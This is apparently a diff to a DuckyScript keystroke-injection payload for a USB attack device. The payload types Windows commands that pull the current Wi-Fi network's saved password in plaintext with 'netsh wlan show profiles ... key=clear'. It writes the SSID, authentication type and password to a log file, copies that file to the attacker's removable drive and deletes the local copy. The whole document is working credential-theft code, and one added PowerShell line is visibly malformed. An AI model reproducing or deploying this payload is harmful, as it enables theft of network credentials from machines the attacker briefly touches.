@@ -13,14 +13,14 @@ ENTER
 DELAY 500
 
 REM --> Getting Drive Letter
-STRING for /f "tokens=2 delims==" %%d in ('wmic logicaldisk where 'drivetype=2' get name /format:value') do set driveletter=%%d
+STRING for /f "tokens=2 delims==" %D in ('wmic logicaldisk where 'drivetype=2' get name /format:value') do set drive=%D
 ENTER
 
 REM --> Getting SSID
-
-STRING cd "%driveletter%" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
+STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
 ENTER
-
+STRING $driveLetter = Get-WMIObject Win32_Volume | ? { $_.FileSystem -eq 'FAT32' | select Name
+ENTER
 
 REM --> Creating A.txt
 STRING netsh wlan show profiles %A% key=clear | findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>A.txt
@@ -45,7 +45,7 @@ ENTER
 REM --> Create Log.txt
 STRING echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt
 ENTER
-STRING move-item Log.txt %A Z=%A
+STRING copy Log.txt %drive%
 
 REM --> Delete Log.txt and exit
 STRING del Log.txt & exit
